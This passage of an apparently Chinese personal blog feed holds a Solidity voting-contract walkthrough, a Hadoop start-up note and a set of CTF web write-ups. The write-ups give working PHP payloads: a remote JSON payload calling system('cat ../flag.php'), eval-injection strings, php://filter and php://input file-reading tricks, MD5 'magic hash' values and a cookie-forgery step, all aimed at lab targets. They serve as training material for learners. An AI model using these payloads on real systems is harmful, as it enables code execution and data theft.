如果require的第一个参数结果为false，则执行中止，所有状态变化，以太币余额变化都会还原</span></span><br><span class="line">        <span class="comment">// 老版EVM中，这会耗光所有GAS</span></span><br><span class="line">        <span class="comment">// “require” 来检查函数是否正确调用</span></span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.sender == chairperson ,</span><br><span class="line">            <span class="string">"only chairperson can give right to vote"</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            !voters[voter].voted,</span><br><span class="line">            <span class="string">"The voter already voted"</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(voters[voter].weight == <span class="number">0</span>) ;</span><br><span class="line">        voters[voter].weight = <span class="number">1</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 把投票权赋予投票人 “to”</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params">address to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 对引用赋值</span></span><br><span class="line">        Voter storage sender = voters[msg.sender] ;</span><br><span class="line">        <span class="built_in">require</span> (!sender.voted,<span class="string">"You are already voted"</span>) ;</span><br><span class="line">        <span class="built_in">require</span>(to != msg.sender, <span class="string">"self-delegation is disallowed"</span>) ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 当“to”也是被授权时，继续转授权</span></span><br><span class="line">        <span class="comment">// 一般来说这种循环很危险，因为运行时间长，与完成一个区块相比，需要更多的gas费用</span></span><br><span class="line">        <span class="comment">// 在本例中，代表授权不会被执行。在其他情况下，这一循环可能导致合约的非正常运行</span></span><br><span class="line">        <span class="keyword">while</span> (voters[to].delegate != address(<span class="number">0</span>))&#123;</span><br><span class="line">            to = voters[to].delegate ;</span><br><span class="line">            <span class="comment">// 检验是否存在不允许的代表授权</span></span><br><span class="line">            <span class="built_in">require</span>(to != msg.sender,<span class="string">"Found loop in delegation"</span>) ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// sender是一个引用，所以修改了“voters[msg.sender].voted”</span></span><br><span class="line">        sender.voted = <span class="literal">true</span> ;</span><br><span class="line">        sender.delegate = to ;</span><br><span class="line">        Voter storage delegate_ = voters[to] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (delegate_.voted)&#123;</span><br><span class="line">            <span class="comment">// 如果代表已投票，则直接增加投票数量</span></span><br><span class="line">            proposals[delegate_.vote].voteCount += sender.weight ;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果代表未投票，则增加权重</span></span><br><span class="line">            delegate_.weight += sender.weight ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将投票（包括授权给你的投票）投给提案“proposals[proposal].name”</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vote</span> (<span class="params">uint proposal</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        Voter storage sender = voters[msg.sender] ;</span><br><span class="line">        <span class="built_in">require</span>(!sender.voted,<span class="string">"Already voted"</span>) ;</span><br><span class="line">        sender.voted = <span class="literal">true</span> ;</span><br><span class="line">        sender.vote = proposal ;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果 “proposal”超过数组范围，则自动释放这一信息，并还原所有改变</span></span><br><span class="line">        proposals[proposal].voteCount += sender.weight ;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据此前全部投票，统计获胜提案</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">winningProposal</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint winningProposal_</span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        uint winningVoteCount = <span class="number">0</span> ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (uint p=<span class="number">0</span>;p&lt;proposals.length;p++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (proposals[p].voteCount &gt; winningVoteCount)&#123;</span><br><span class="line">                winningVoteCount = proposals[p].voteCount ;</span><br><span class="line">                winningProposal_= p ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用call winningPropopsal() 函数取得包含在提案数组中的获胜者的索引，并返回获胜者的名称</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">winnerName</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bytes32 winnerName_</span>)</span>&#123;</span><br><span class="line">        winnerName_ = proposals[winningProposal()].name ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hadoop操作</title>
    <link href="http://runindark.com/2019/10/25/hadoop/"/>
    <id>http://runindark.com/2019/10/25/hadoop/</id>
    <published>2019-10-25T03:47:01.713Z</published>
    <updated>2019-10-25T03:57:04.318Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>hadoop 系列操作<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="hadoop-启动"><a href="#hadoop-启动" class="headerlink" title="hadoop 启动"></a>hadoop 启动</h3><blockquote><p>cd <em>**</em>  进入hadoop目录<br>./sbin/start-dfs.sh  启动hadoop-dfs<br>./sbin/start-all.sh  启动所有的</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;hadoop 系列操作&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf - 合集</title>
    <link href="http://runindark.com/2019/10/24/CTF-%E5%81%9A%E9%A2%98%E5%90%88%E9%9B%86/"/>
    <id>http://runindark.com/2019/10/24/CTF-做题合集/</id>
    <published>2019-10-24T13:02:54.218Z</published>
    <updated>2019-11-08T10:22:07.620Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>自己后来做过的各种乱七八糟的题目<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h3 id="爱い窒息、痛-—-php源码阅读-让系统读木马"><a href="#爱い窒息、痛-—-php源码阅读-让系统读木马" class="headerlink" title="爱い窒息、痛 —- php源码阅读,让系统读木马"></a>爱い窒息、痛 —- php源码阅读,让系统读木马</h3><blockquote><p>靶机：<a href="http://114.55.36.69:8020" target="_blank" rel="noopener">http://114.55.36.69:8020</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* vim: set expandtab tabstop=4 shiftwidth=4: */</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | PHP version 5                                                        |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Copyright (c) 1997-2004 The PHP Group                                |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | This source file is subject to version 3.0 of the PHP license,       |</span></span><br><span class="line"><span class="comment">// | that is bundled with this package in the file LICENSE, and is        |</span></span><br><span class="line"><span class="comment">// | available through the world-wide-web at the following url:           |</span></span><br><span class="line"><span class="comment">// | http://www.php.net/license/3_0.txt.                                  |</span></span><br><span class="line"><span class="comment">// | If you did not receive a copy of the PHP license and are unable to   |</span></span><br><span class="line"><span class="comment">// | obtain it through the world-wide-web, please send a note to          |</span></span><br><span class="line"><span class="comment">// | license@php.net so we can mail you a copy immediately.               |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | Authors: Original Author &lt;author@example.com&gt;                        |</span></span><br><span class="line"><span class="comment">// |          Your Name &lt;you@example.com&gt;                                 |</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// $Id:$</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a); <span class="comment">// 关键是这个函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123; </span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b); <span class="comment">//这里要求从某个链接的文件读取json字符串，包含f，d字段的json，而且f，d里必须是一段木马，木马格式见下</span></span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]); <span class="comment">// 木马格式</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><p>url方式，超过40个字符长度才可以进入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;<span class="comment">//url切分</span></span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;<span class="comment">//如果长度&gt;40,$f = a[30:35],$g = a[10:20]</span></span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入字符串示例： http://aaa.com/a.phpccccccccccflag0aaaaaaaaa</span></span><br></pre></td></tr></table></figure></p><p>下面是需要让 file_get_contents($b) 访问到木马json文件的内容是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = <span class="keyword">array</span>( </span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>, </span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span> </span><br><span class="line">); </span><br><span class="line">$url = json_encode($url); </span><br><span class="line"><span class="keyword">echo</span> $url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>构造成功之后是： </p><blockquote><p>{“f”:”system”,”d”:”cat ..\/flag.php”}</p></blockquote><h3 id="bugku-系列"><a href="#bugku-系列" class="headerlink" title="bugku 系列"></a>bugku 系列</h3><h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><blockquote><p><a href="http://123.206.87.240:8004/index1.php" target="_blank" rel="noopener">http://123.206.87.240:8004/index1.php</a></p></blockquote><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123; <span class="comment">//正则匹配=&gt; /^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>); <span class="comment">// 执行命令代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>分析php的9大内置变量</p><blockquote><p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>$SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了所有全局变量的数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p></blockquote><p>得出令  args=GLOBALS  获得flag</p><h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>套路比较多，内容丰富，值得记录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">    $a = @$_REQUEST[<span class="string">'hello'</span>];  <span class="comment">// 获取hello参数</span></span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);  <span class="comment">// var_dump()输出文件信息，需要绕过</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>套路一 直接闭合var_dump </p><blockquote><p>hello=1);show_source(%27flag.php%27);var_dump(3<br><a href="http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)" target="_blank" rel="noopener">http://123.206.87.240:8003/index.php?hello=1);print_r(file(&quot;./flag.php&quot;)</a></p></blockquote></li><li><p>套路二 利用伪协议<br>直接使用post来使用伪协议</p><blockquote><p><a href="http://120.24.86.145:8003/index.php?hello=1);include" target="_blank" rel="noopener">http://120.24.86.145:8003/index.php?hello=1);include</a> $_POST[‘f’];//<br>在POST区域：f=php://filter/convert.base64-encode/resource=flag.php</p></blockquote></li><li><p>套路三 直接来</p><blockquote><p>?hello=get_file_contents(‘flag.php’)<br>?hello=file(‘flag.php’)</p></blockquote></li></ol><p>总之是字符串拼接玩出了花·····emm</p><h4 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h4><ol><li>看到备份首先想到 .bak  文件</li><li>利用御剑工具扫描查看到 index.php ,猜测拿到index.php.bak</li><li>套路：<br>1.) 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。<blockquote><p>QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a<br>2.) 利用==漏洞，数组无法被识别，都是null</p></blockquote></li><li>特色<br>$_SERVER[‘REQUEST_URI’]  用来获取url，可以当作get请求</li></ol><h4 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h4><p>这个故事告诉我们，这狗题目说快速，就说明手动是绝对不行了，需要走脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://120.24.86.145:8002/web6/"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息头里</span></span><br><span class="line"> </span><br><span class="line">str=base64.b64decode(headers[<span class="string">'flag'</span>])</span><br><span class="line">str=str.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line"> </span><br><span class="line">flag = base64.b64decode(str.split(<span class="string">':'</span>)[<span class="number">1</span>])<span class="comment">#获得flag:后的值</span></span><br><span class="line">data=&#123;<span class="string">'margin'</span>:flag&#125;</span><br><span class="line"><span class="keyword">print</span> (r.post(url,data).text)<span class="comment">#post方法传上去</span></span><br></pre></td></tr></table></figure></p><h4 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h4><p>靶机： <a href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=" target="_blank" rel="noopener">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ=</a></p><ol><li>铺面的字符串是无效的</li><li>发现在url中看到有base64编码的a2V5cy50eHQ= </li><li>访问后发现依然是无效的字符串</li><li>filenam顾名思义可以尝试伪协议，尝试无效</li><li>盲猜filename是可以读取文件，尝试filename赋值为 index.php </li><li>修改line的数据，发现可以读出一行的数据，写脚本读出index.php的完整代码</li><li><p>脚本： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>) &#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list)) &#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>得出结论发现，cookie为margin=margin可以给文件读取的数组赋值给keys.php，则keys.php可能是最终结果隐藏的地方</p></li><li>在burpsuite中更改cookie<blockquote><p>Cookie: margin=margin </p></blockquote></li><li>keys.php进行base64编码后传入给filename,得出结果<h4 id="web8-姿势整合了"><a href="#web8-姿势整合了" class="headerlink" title="web8 姿势整合了"></a>web8 姿势整合了</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>可以看到ac = f 就行了 </p><ol><li>套路1：<br>看题目说txt 盲猜 flag.txt 直接拿到</li><li>伪协议<br>ac = 5<br>fn = php://input<br>post数据 5<br>可以获得</li></ol></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;自己后来做过的各种乱七八糟的题目&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ctf 杂录</title>
    <link href="http://runindark.com/2019/10/21/CTF-%E6%9D%82%E8%AE%B0/"/>
    <id>http://runindark.com/2019/10/21/CTF-杂记/</id>
    <published>2019-10-21T02:49:23.977Z</published>
    <updated>2019-11-08T11:59:04.348Z</updated>
    
